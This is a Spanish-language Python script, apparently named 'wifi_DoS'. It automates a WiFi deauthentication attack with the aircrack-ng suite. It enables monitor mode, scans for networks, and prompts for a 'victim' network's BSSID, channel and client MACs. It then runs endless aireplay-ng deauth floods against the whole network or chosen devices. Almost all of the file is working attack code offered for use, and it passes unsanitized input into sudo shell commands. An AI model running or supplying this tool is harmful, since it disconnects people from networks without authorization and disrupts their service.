#!/bin/env python3

#librerias
import os
import time
import signal
#colores
RED = "\033[31m"
GREEN = "\033[32m"
RESET = "\033[0m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
banner = """
\033[32m 
                  ███     ██████   ███            ██████████             █████████ 
                 ░░░     ███░░███ ░░░            ░░███░░░░███           ███░░░░░███
 █████ ███ █████ ████   ░███ ░░░  ████            ░███   ░░███  ██████ ░███    ░░░ 
░░███ ░███░░███ ░░███  ███████   ░░███            ░███    ░███ ███░░███░░█████████ 
 ░███ ░███ ░███  ░███ ░░░███░     ░███            ░███    ░███░███ ░███ ░░░░░░░░███
 ░░███████████   ░███   ░███      ░███            ░███    ███ ░███ ░███ ███    ░███
  ░░████░████    █████  █████     █████ █████████ ██████████  ░░██████ ░░█████████ 
   ░░░░ ░░░░    ░░░░░  ░░░░░     ░░░░░ ░░░░░░░░░ ░░░░░░░░░░    ░░░░░░   ░░░░░░░░░  
\033[0m


\033[31mInstagram:\033[0m \033[0;35mmacim0_\033[0m

"""
print(banner)

os.system("ls /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin /usr/games /usr/local/games /snap/bin | grep 'aircrack-ng' > /tmp/aircrack_check.txt")
with open("/tmp/aircrack_check.txt", "r") as file:
    resultado = file.read()
if 'aircrack-ng' not in resultado:
    print(f"{RED}Aircrack-ng no existe en su sistema y es necesario para que el script funcione{RESET}")
    snap_o_apt = input(f"{GREEN}Desea instalarlo con {RESET}{RED}'apt'{RESET}{GREEN}, con {RED}'snap'{RESET}{GREEN}, con {RED}'pacman'{RESET}{GREEN} o salir? 'a', 's', 'p' o 'e': {RESET}").lower()
    if snap_o_apt == 's':
        print("Instalando snapd....")
        os.system("sudo apt install snapd")
        print("Instalando aircrack-ng....")
        os.system("sudo snap install aircrack-ng-snap")
    elif snap_o_apt == 'a':
        print("Instalando aircrack-ng")
        os.system("sudo apt install aircrack-ng")
    elif snap_o_apt == 'e':
        print("Saliendo...")
        os.system("rm /tmp/aircrack_check.txt")
        exit()
    elif snap_o_apt == 'p':
        print("Instalando aircrack-ng")
        os.system("sudo pacman -S aircrack-ng")
os.system("rm /tmp/aircrack_check.txt")
time.sleep(3)
os.system("clear")

#info
os.system("cat /proc/net/dev | awk -F':' '{if (NR>2) print $1}' | tr -d ' '")
placa = input(f"{YELLOW}Escriba el nombre de su tarjeta de red:{RESET} ")
print(f"{RED}Habilitando el modo monitor{RESET}")
os.system(f"sudo airmon-ng start {placa} > /dev/null 2>&1")
print(f"{YELLOW}Modo monitor{RESET} {GREEN}ACTIVADO{RESET}")
os.system("cat /proc/net/dev | awk -F':' '{if (NR>2) print $1}' | tr -d ' '")
placa2 = input(f"{YELLOW}Escriba el nuevo nombre de su placa de red:{RESET} ")



#reconocimiento
os.system(f"sudo airodump-ng --band abg {placa2}")
bssid = input(f"{RED}Escriba el 'bssid' de la red victima:{RESET} ")
ch = input(f"{RED}Ahora escriba el 'channel' de la red victima:{RESET} ")
os.system(f"sudo airodump-ng --band abg --bssid {bssid} -c {ch} {placa2}")
pregunta = input(f"{YELLOW}Desea atacar un solo dispositivo o toda la red?(r) o (d):{RESET} ")




#ataque
if pregunta == "r":
    print(f"{BLUE}ATACANDO{RESET}")
    os.system(f"sudo aireplay-ng -0 0 -a {bssid} {placa2} > /dev/null 2>&1")
elif pregunta == "d":
    uno_o_mas = input(f"{YELLOW}Quiere atacar 1 o mas dispositivos de la red? 'u' o 'm':{RESET} ").lower()
    if uno_o_mas == 'u':
        mac = input(f"{YELLOW}Escriba la 'station' del dispositivo victima:{RESET} ")
        print(f"{BLUE}ATACANDO{RESET}")
        os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c {mac} {placa2} > /dev/null 2>&1")
    elif uno_o_mas == 'm':
        numero = int(input(f"{RED}Cuantos dispositivos son?:{RESET} "))
        print(f"{YELLOW}Ahora se le preguntará varias veces lo mismo, pero es para saber cada station de cada dispositivo,{RESET} {RED}no es un error.{RESET}")
        pids = []
        for i in range(numero):
            station = input(f"{RED}Escriba la station de el dispositivo:{RESET} ")
            os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c {station} {placa2} > /dev/null 2>&1 & echo $! >> pids.txt")

        with open("pids.txt", "r") as file:
            pids = file.readlines()

        pids = [int(pid.strip()) for pid in pids]
        print(f"{BLUE}Ataque lanzado para todos los dispositivos elegidos{RESET}")
        input(f"{RED}Presiona Enter para detener el ataque...{RESET}")

        for pid in pids:
            os.system(f"sudo kill -9 {pid}")

        os.remove("pids.txt")
        print(f"{GREEN}Todos los ataques han sido detenidos{RESET}")


#finalizacion
print(f"{GREEN}Saliendo del modo monitor{RESET}")
os.system(f"sudo airmon-ng stop {placa2} > /dev/null 2>&1")
print("Adiós")

time.sleep(3)
os.system("clear")
